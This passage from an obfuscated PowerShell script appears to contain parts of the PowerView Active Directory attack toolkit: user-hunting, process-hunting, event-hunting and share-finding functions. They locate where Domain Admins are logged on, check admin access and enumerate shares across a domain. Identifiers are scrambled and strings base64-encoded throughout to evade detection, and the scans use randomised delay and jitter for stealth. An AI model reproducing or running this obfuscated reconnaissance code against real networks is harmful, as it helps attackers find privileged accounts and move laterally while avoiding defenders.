                                    ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $_.MemberDomain
                                    ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                    ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                                    ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${/===\_/\/==\/\/=\}
                                    ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${/=\_/==\/===\_/=\}
                                    try {
                                        ${____/====\___/\_/} = [System.Net.Dns]::GetHostEntry(${/=\_/==\/===\_/=\}) | select -ExpandProperty HostName
                                        ${_/=\_/==\_/\___/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) ${____/====\___/\_/}
                                    }
                                    catch {
                                        ${_/=\_/==\_/\___/=} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    }
                                    if ($CheckAccess) {
                                        ${__/=\/=\/===\_/\/} = __/=\___/\_/\/==== -ComputerName ${/=\_/==\/===\_/=\}
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${__/=\/=\/===\_/\/}.IsAdmin
                                    }
                                    else {
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${_/=\_/==\_/\___/=}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFMAZQBzAHMAaQBvAG4A'))))
                                    ${_/=\_/==\_/\___/=}
                                }
                            }
                        }
                    }
                    if(!${_/=\_/\/\/\__/\/==}) {
                        ${__/\_/\_/=\_/=\/\} = __/=\/\__/\/\/\/=\ -ComputerName $ComputerName
                        ForEach (${_/\_/=\/\/=\_/===} in ${__/\_/\_/=\_/=\/\}) {
                            $UserName = ${_/\_/=\/\/=\_/===}.wkui1_username
                            ${_/====\__/\_/==\/} = ${_/\_/=\/\/=\_/===}.wkui1_logon_domain
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                ${_____/\/===\_____/} | ? {$UserName -like $_.MemberName} | % {
                                    ${/==\_/=\__/====\_} = $True
                                    if(${_/===\_/==\_/=\_/}) {
                                        if (${_/===\_/==\_/=\_/}.ToLower() -ne ${_/====\__/\_/==\/}.ToLower()) {
                                            ${/==\_/=\__/====\_} = $True
                                        }
                                        else {
                                            ${/==\_/=\__/====\_} = $False
                                        }
                                    }
                                    if(${/==\_/=\__/====\_}) {
                                        ${/===\_/\/==\/\/=\} = @(_/=\/=\/=\_/=\/\_/ -ComputerName $ComputerName)[0].IPAddress
                                        ${_/=\_/==\_/\___/=} = New-Object PSObject
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${_/====\__/\_/==\/}
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${/===\_/\/==\/\/=\}
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                        ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                        if ($CheckAccess) {
                                            ${__/=\/=\/===\_/\/} = __/=\___/\_/\/==== -ComputerName $ComputerName
                                            ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${__/=\/=\/===\_/\/}.IsAdmin
                                        }
                                        else {
                                            ${_/=\_/==\_/\___/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                        }
                                        ${_/=\_/==\_/\___/=}.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFMAZQBzAHMAaQBvAG4A'))))
                                        ${_/=\_/==\_/\___/=}
                                    }
                                }
                            }
                        }
                    }
                    if (${_/=\_/\____/\/=\__} -gt 0) {
                        sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                } While (${_/=\_/\____/\/=\__} -gt 0 -and ${/=\/\___/\/===\__}.Elapsed.TotalSeconds -lt ${_/=\_/\____/\/=\__})
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = ${_____/\/===\_____/}
                'CurrentUser' = ${/=\____/\/\_/=\/=}
                'Stealth' = ${_/=\_/\/\/\__/\/==}
                'DomainShortName' = ${_/===\_/==\_/=\_/}
                'Poll' = ${_/=\_/\____/\/=\__}
                'Delay' = $Delay
                'Jitter' = $Jitter
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ${_/=\/\_/\/\__/=\_} = New-Object System.Random
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                ${__/\/\_/\___/=\__} = icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${___/==\/\/==\/=\/}, $False, ${_____/\/===\_____/}, ${/=\____/\/\_/=\/=}, ${_/=\_/\/\/\__/\/==}, ${_/===\_/==\_/=\_/}, 0, 0, 0
                ${__/\/\_/\___/=\__}
                if(${__/\/\_/\___/=\__} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIAIABmAG8AdQBuAGQALAAgAHIAZQB0AHUAcgBuAGkAbgBnACAAZQBhAHIAbAB5AA==')))
                    return
                }
            }
        }
    }
}
function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All"
    )
    _/===\_/\_/=\__/\_ -_/=\_/\/\/\__/\/== @PSBoundParameters
}
function Invoke-ProcessHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $ProcessName,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBQAHIAbwBjAGUAcwBzAEgAdQBuAHQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                ${__/==\/=\_/=\/\__} = @($Domain)
            }
            elseif($SearchForest) {
                ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ -DomainController $DomainController -Credential $Credential | % { $_.Name }
            }
            else {
                ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/ -Domain $Domain -Credential $Credential).name )
            }
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if(!$ProcessName) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAG8AYwBlAHMAcwAgAG4AYQBtAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAsACAAYgB1AGkAbABkAGkAbgBnACAAYQAgAHQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAHMAZQB0AA==')))
            ${_____/\/===\_____/} = @()
            if($TargetServer) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
                ${_____/\/===\_____/} = __/\_/\/\_/\_/=\/\ $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                    ($_.AccountName).split("/")[1].toLower()
                }  | ? {$_}
            }
            elseif($UserName) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAB0AGEAcgBnAGUAdAAgAHUAcwBlAHIAIAAnACQAVQBzAGUAcgBOAGEAbQBlACcALgAuAC4A')))
                ${_____/\/===\_____/} = @( $UserName.ToLower() )
            }
            elseif($UserFile) {
                ${_____/\/===\_____/} = gc -Path $UserFile | ? {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                    ${_____/\/===\_____/} += __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $UserADSpath -Filter $UserFilter | % {
                        $_.samaccountname
                    }  | ? {$_}
                }
            }
            else {
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                    ${_____/\/===\_____/} += _/\____/=\__/\/\/\ -GroupName $GroupName -Domain $Domain -DomainController $DomainController -Credential $Credential| % {
                        $_.MemberName
                    }
                }
            }
            if ((-not $ShowAll) -and ((!${_____/\/===\_____/}) -or (${_____/\/===\_____/}.Count -eq 0))) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
            }
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, $ProcessName, ${_____/\/===\_____/}, $Credential)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                ${/\____/====\/=\_/} = _/=\_/===\/\/\/=== -Credential $Credential -ComputerName $ComputerName -ErrorAction SilentlyContinue
                ForEach (${_/\__/\/==\__/\/\} in ${/\____/====\/=\_/}) {
                    if($ProcessName) {
                        $ProcessName.split(",") | % {
                            if (${_/\__/\/==\__/\/\}.ProcessName -match $_) {
                                ${_/\__/\/==\__/\/\}
                            }
                        }
                    }
                    elseif (${_____/\/===\_____/} -contains ${_/\__/\/==\__/\/\}.User) {
                        ${_/\__/\/==\__/\/\}
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = ${_____/\/===\_____/}
                'Credential' = $Credential
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                ${__/\/\_/\___/=\__} = icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${___/==\/\/==\/=\/}, $False, $ProcessName, ${_____/\/===\_____/}, $Credential
                ${__/\/\_/\___/=\__}
                if(${__/\/\_/\___/=\__} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIALwBwAHIAbwBjAGUAcwBzACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
    }
}
function Invoke-EventHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String[]]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Int32]
        $SearchDays = 3,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Management.Automation.PSCredential]
        $Credential
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBFAHYAZQBuAHQASAB1AG4AdABlAHIA')))
        if($Domain) {
            ${__/==\/=\_/=\/\__} = @($Domain)
        }
        elseif($SearchForest) {
            ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
        }
        else {
            ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/ -Credential $Credential).name )
        }
        if(!$ComputerName) { 
            if($ComputerFile) {
                $ComputerName = gc -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                    $ComputerName += _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGQAbwBtAGEAaQBuACAAYwBvAG4AdAByAG8AbABsAGUAcgBzAA==')))
                    $ComputerName += __/=\____/=\/=\__/ -LDAP -Domain $Domain -DomainController $DomainController -Credential $Credential | % { $_.dnshostname}
                }
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${_____/\/===\_____/} = @()
        if($TargetServer) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
            ${_____/\/===\_____/} = __/\_/\/\_/\_/=\/\ $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                ($_.AccountName).split("/")[1].toLower()
            }  | ? {$_}
        }
        elseif($UserName) {
            ${_____/\/===\_____/} = $UserName | % {$_.ToLower()}
            if(${_____/\/===\_____/} -isnot [System.Array]) {
                ${_____/\/===\_____/} = @(${_____/\/===\_____/})
            }
        }
        elseif($UserFile) {
            ${_____/\/===\_____/} = gc -Path $UserFile | ? {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                ${_____/\/===\_____/} += __/=\_/\_/\/=\___/ -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $UserADSpath -Filter $UserFilter | % {
                    $_.samaccountname
                }  | ? {$_}
            }
        }
        else {
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                ${_____/\/===\_____/} += _/\____/=\__/\/\/\ -GroupName $GroupName -Domain $Domain -DomainController $DomainController -Credential $Credential | % {
                    $_.MemberName
                }
            }
        }
        if (((!${_____/\/===\_____/}) -or (${_____/\/===\_____/}.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, ${_____/\/===\_____/}, $SearchDays, $Credential)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                if($Credential) {
                    _/=\/=\__/=\__/==\ -ComputerName $ComputerName -Credential $Credential -___/=\/=\_/\_/\__/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))) -____/\___/=\/\_/=\ ([DateTime]::Today.AddDays(-$SearchDays)) | ? {
                        ${_____/\/===\_____/} -contains $_.UserName
                    }
                }
                else {
                    _/=\/=\__/=\__/==\ -ComputerName $ComputerName -___/=\/=\_/\_/\__/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))) -____/\___/=\/\_/=\ ([DateTime]::Today.AddDays(-$SearchDays)) | ? {
                        ${_____/\/===\_____/} -contains $_.UserName
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = ${_____/\/===\_____/}
                'SearchDays' = $SearchDays
                'Credential' = $Credential
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${___/==\/\/==\/=\/}, $(-not $NoPing), ${_____/\/===\_____/}, $SearchDays, $Credential
            }
        }
    }
}
function Invoke-ShareFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $ExcludeStandard,
        [Switch]
        $ExcludePrint,
        [Switch]
        $ExcludeIPC,
        [Switch]
        $NoPing,
        [Switch]
        $CheckShareAccess,
        [Switch]
        $CheckAdmin,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBTAGgAYQByAGUARgBpAG4AZABlAHIAIAB3AGkAdABoACAAZABlAGwAYQB5ACAAbwBmACAAJABEAGUAbABhAHkA')))
        [String[]] ${_/=\/==\/\/\/=\/=} = @('')
        if ($ExcludePrint) {
            ${_/=\/==\/\/\/=\/=} = ${_/=\/==\/\/\/=\/=} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA')))
        }
        if ($ExcludeIPC) {
            ${_/=\/==\/\/\/=\/=} = ${_/=\/==\/\/\/=\/=} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))
        }
        if ($ExcludeStandard) {
